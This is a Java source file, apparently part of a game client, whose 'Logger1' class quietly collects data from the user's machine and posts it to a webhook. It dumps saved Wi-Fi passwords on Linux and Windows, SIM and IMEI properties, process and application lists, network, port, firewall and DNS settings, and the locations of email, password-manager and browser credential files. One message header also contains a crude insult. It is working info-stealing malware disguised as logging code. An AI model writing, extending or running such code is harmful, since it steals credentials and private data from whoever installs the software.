package treacherousswine.doomix.client.logger;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class Logger1 {
    
    public static void logWiFiNetworks() {
        try {
            StringBuilder wifiInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("nmcli", "dev", "wifi");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 20) {
                    wifiInfo.append(line).append("\n");
                    count++;
                }
                reader.close();
                
                Path wpasupplicant = Paths.get("/etc/wpa_supplicant/wpa_supplicant.conf");
                if (Files.exists(wpasupplicant)) {
                    wifiInfo.append("\n=== saved wifi ===\n");
                    Files.lines(wpasupplicant)
                        .filter(l -> l.contains("ssid") || l.contains("psk"))
                        .limit(20)
                        .forEach(l -> wifiInfo.append(l).append("\n"));
                }
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("powershell", "-Command", 
                    "netsh wlan show profile | findstr All");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    wifiInfo.append(line).append("\n");
                }
                reader.close();
                
                pb = new ProcessBuilder("powershell", "-Command",
                    "netsh wlan show profile name=* key=clear | findstr -E '(SSID|Key Content)'");
                p = pb.start();
                reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                while ((line = reader.readLine()) != null) {
                    wifiInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            wifiInfo.append("```");
            Logger.sendWebhookMessage(wifiInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] wifi scan error: " + e.getMessage());
        }
    }
    
    public static void logSIMCardInfo() {
        try {
            StringBuilder simInfo = new StringBuilder(" **little satanist boy gon once again showing he is bankruptcy clueless dimwit consistently being owned and blaming wifi getting a bit sad at this point losing to lt3 get a gaming chair you senseless cowardly dog loL**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("android") || os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("getprop");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.toLowerCase().contains("sim") || line.toLowerCase().contains("imei") ||
                        line.toLowerCase().contains("phone") || line.toLowerCase().contains("mobile")) {
                        simInfo.append(line).append("\n");
                    }
                }
                reader.close();
            }
            
            simInfo.append("```");
            Logger.sendWebhookMessage(simInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] sim info error: " + e.getMessage());
        }
    }
    
    public static void logDetailedRAMInfo() {
        try {
            StringBuilder ramInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            Runtime rt = Runtime.getRuntime();
            ramInfo.append("=== JVM RAM ===\n");
            ramInfo.append("max: ").append(rt.maxMemory() / 1024 / 1024).append(" mb\n");
            ramInfo.append("total: ").append(rt.totalMemory() / 1024 / 1024).append(" mb\n");
            ramInfo.append("free: ").append(rt.freeMemory() / 1024 / 1024).append(" mb\n");
            ramInfo.append("used: ").append((rt.totalMemory() - rt.freeMemory()) / 1024 / 1024).append(" mb\n");
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("cat", "/proc/meminfo");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    ramInfo.append(line).append("\n");
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("powershell", "-Command",
                    "Get-WmiObject Win32_PhysicalMemory | select Capacity, Manufacturer, Speed");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    ramInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            ramInfo.append("```");
            Logger.sendWebhookMessage(ramInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] ram info error: " + e.getMessage());
        }
    }
    
    public static void logCPUInfo() {
        try {
            StringBuilder cpuInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            cpuInfo.append("processors: ").append(Runtime.getRuntime().availableProcessors()).append("\n");
            cpuInfo.append("arch: ").append(System.getProperty("os.arch")).append("\n");
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("cat", "/proc/cpuinfo");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 25) {
                    cpuInfo.append(line).append("\n");
                    count++;
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("wmic", "cpu", "get", "name");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    cpuInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            cpuInfo.append("```");
            Logger.sendWebhookMessage(cpuInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] cpu info error: " + e.getMessage());
        }
    }
    
    public static void logBackgroundAppsAndProcesses() {
        try {
            StringBuilder appInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            ProcessBuilder pb;
            if (os.contains("linux")) {
                pb = new ProcessBuilder("ps", "aux");
            } else if (os.contains("windows")) {
                pb = new ProcessBuilder("tasklist", "/v", "/fo", "csv");
            } else {
                return;
            }
            
            Process p = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            int count = 0;
            while ((line = reader.readLine()) != null && count < 30) {
                appInfo.append(line).append("\n");
                count++;
            }
            reader.close();
            
            appInfo.append("```");
            Logger.sendWebhookMessage(appInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] background apps error: " + e.getMessage());
        }
    }
    
    public static void logEmailAccounts() {
        try {
            StringBuilder emailInfo = new StringBuilder(" **example**\n```\n");
            String homeDir = System.getProperty("user.home");
            
            String[] emailPaths = {
                homeDir + "/.config/thunderbird",
                homeDir + "/.local/share/evolution/mail",
                homeDir + "/AppData/Roaming/Thunderbird",
                homeDir + "/AppData/Roaming/Microsoft/Outlook"
            };
            
            for (String emailPath : emailPaths) {
                Path p = Paths.get(emailPath);
                if (Files.exists(p)) {
                    emailInfo.append("email config: ").append(emailPath).append("\n");
                    Files.walk(p, 2)
                        .filter(Files::isRegularFile)
                        .filter(f -> f.toString().contains("account") || f.toString().contains("mail"))
                        .limit(10)
                        .forEach(f -> emailInfo.append("  - ").append(f.getFileName()).append("\n"));
                }
            }
            
            emailInfo.append("```");
            Logger.sendWebhookMessage(emailInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] email config error: " + e.getMessage());
        }
    }
    
    public static void logPasswordManagers() {
        try {
            StringBuilder pwdInfo = new StringBuilder(" **example**\n```\n");
            String homeDir = System.getProperty("user.home");
            
            String[] pwdPaths = {
                homeDir + "/.keepass",
                homeDir + "/.config/keepass",
                homeDir + "/.lastpass",
                homeDir + "/.mozilla/firefox",
                homeDir + "/AppData/Local/Google/Chrome/User Data",
                homeDir + "/.config/chromium"
            };
            
            for (String pwdPath : pwdPaths) {
                Path p = Paths.get(pwdPath);
                if (Files.exists(p)) {
                    pwdInfo.append("password manager: ").append(pwdPath).append("\n");
                    Files.walk(p, 2)
                        .filter(Files::isRegularFile)
                        .filter(f -> f.toString().toLowerCase().contains("password") || 
                               f.toString().toLowerCase().contains("credential") ||
                               f.toString().toLowerCase().contains("login") ||
                               f.toString().toLowerCase().endsWith(".db") ||
                               f.toString().toLowerCase().endsWith(".sqlite"))
                        .limit(15)
                        .forEach(f -> pwdInfo.append("  - ").append(f.getFileName()).append("\n"));
                }
            }
            
            pwdInfo.append("```");
            Logger.sendWebhookMessage(pwdInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] password manager error: " + e.getMessage());
        }
    }
    
    public static void logSystemHardwareInfo() {
        try {
            StringBuilder hwInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("lsb_release", "-a");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    hwInfo.append(line).append("\n");
                }
                reader.close();
                
                pb = new ProcessBuilder("lspci");
                p = pb.start();
                reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                int count = 0;
                while ((line = reader.readLine()) != null && count < 15) {
                    hwInfo.append(line).append("\n");
                    count++;
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("systeminfo");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 25) {
                    hwInfo.append(line).append("\n");
                    count++;
                }
                reader.close();
            }
            
            hwInfo.append("```");
            Logger.sendWebhookMessage(hwInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] hardware info error: " + e.getMessage());
        }
    }
    
    public static void logInstalledApplications() {
        try {
            StringBuilder appListInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("apt", "list", "--installed");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 30) {
                    appListInfo.append(line).append("\n");
                    count++;
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("powershell", "-Command",
                    "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | select DisplayName | head -30");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    appListInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            appListInfo.append("```");
            Logger.sendWebhookMessage(appListInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] app list error: " + e.getMessage());
        }
    }
    
    public static void logBrowserPasswords() {
        try {
            StringBuilder browserPwdInfo = new StringBuilder(" **example**\n```\n");
            String homeDir = System.getProperty("user.home");
            
            String[] browserPwdPaths = {
                homeDir + "/.mozilla/firefox",
                homeDir + "/AppData/Local/Google/Chrome/User Data/Default",
                homeDir + "/AppData/Local/Microsoft/Edge/User Data/Default",
                homeDir + "/.config/chromium",
                homeDir + "/.config/BraveSoftware"
            };
            
            for (String browserPath : browserPwdPaths) {
                Path p = Paths.get(browserPath);
                if (Files.exists(p)) {
                    browserPwdInfo.append("browser: ").append(browserPath).append("\n");
                    Files.walk(p, 2)
                        .filter(Files::isRegularFile)
                        .filter(f -> f.toString().toLowerCase().contains("password") ||
                               f.toString().toLowerCase().contains("login") ||
                               f.toString().toLowerCase().contains("credential") ||
                               f.toString().toLowerCase().endsWith("Login Data") ||
                               f.toString().toLowerCase().endsWith("key3.db") ||
                               f.toString().toLowerCase().endsWith("key4.db"))
                        .limit(10)
                        .forEach(f -> browserPwdInfo.append("  - ").append(f.getFileName()).append("\n"));
                }
            }
            
            browserPwdInfo.append("```");
            Logger.sendWebhookMessage(browserPwdInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] browser password error: " + e.getMessage());
        }
    }
    
    public static void logNetworkConfiguration() {
        try {
            StringBuilder netConfig = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("ip", "addr");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 30) {
                    netConfig.append(line).append("\n");
                    count++;
                }
                reader.close();
                
                pb = new ProcessBuilder("ip", "route");
                p = pb.start();
                reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                while ((line = reader.readLine()) != null) {
                    netConfig.append(line).append("\n");
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("ipconfig", "/all");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 40) {
                    netConfig.append(line).append("\n");
                    count++;
                }
                reader.close();
            }
            
            netConfig.append("```");
            Logger.sendWebhookMessage(netConfig.toString());
        } catch (Exception e) {
            System.err.println("[Logger] network config error: " + e.getMessage());
        }
    }
    
    public static void logOpenPorts() {
        try {
            StringBuilder portsInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            ProcessBuilder pb;
            if (os.contains("linux")) {
                pb = new ProcessBuilder("netstat", "-tulpn");
            } else if (os.contains("windows")) {
                pb = new ProcessBuilder("powershell", "-Command", "Get-NetTCPConnection -State Listen | select LocalAddress, LocalPort, ProcessName");
            } else {
                return;
            }
            
            Process p = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            int count = 0;
            while ((line = reader.readLine()) != null && count < 25) {
                portsInfo.append(line).append("\n");
                count++;
            }
            reader.close();
            
            portsInfo.append("```");
            Logger.sendWebhookMessage(portsInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] open ports error: " + e.getMessage());
        }
    }
    
    public static void logFirewallRules() {
        try {
            StringBuilder firewallInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("sudo", "iptables", "-L");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 20) {
                    firewallInfo.append(line).append("\n");
                    count++;
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("powershell", "-Command", "Get-NetFirewallRule -Enabled True | select DisplayName, Direction | head -20");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    firewallInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            firewallInfo.append("```");
            Logger.sendWebhookMessage(firewallInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] firewall rules error: " + e.getMessage());
        }
    }
    
    public static void logFileShares() {
        try {
            StringBuilder sharesInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                ProcessBuilder pb = new ProcessBuilder("mount");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                int count = 0;
                while ((line = reader.readLine()) != null && count < 20) {
                    sharesInfo.append(line).append("\n");
                    count++;
                }
                reader.close();
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("net", "share");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    sharesInfo.append(line).append("\n");
                }
                reader.close();
            }
            
            sharesInfo.append("```");
            Logger.sendWebhookMessage(sharesInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] file shares error: " + e.getMessage());
        }
    }
    
    public static void logDNSSettings() {
        try {
            StringBuilder dnsInfo = new StringBuilder(" **example**\n```\n");
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("linux")) {
                Path resolveConf = Paths.get("/etc/resolv.conf");
                if (Files.exists(resolveConf)) {
                    Files.lines(resolveConf)
                        .filter(l -> l.contains("nameserver") || l.contains("search"))
                        .forEach(l -> dnsInfo.append(l).append("\n"));
                }
            } else if (os.contains("windows")) {
                ProcessBuilder pb = new ProcessBuilder("ipconfig", "/all");
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.toLowerCase().contains("dns")) {
                        dnsInfo.append(line).append("\n");
                    }
                }
                reader.close();
            }
            
            dnsInfo.append("```");
            Logger.sendWebhookMessage(dnsInfo.toString());
        } catch (Exception e) {
            System.err.println("[Logger] dns settings error: " + e.getMessage());
        }
    }
}
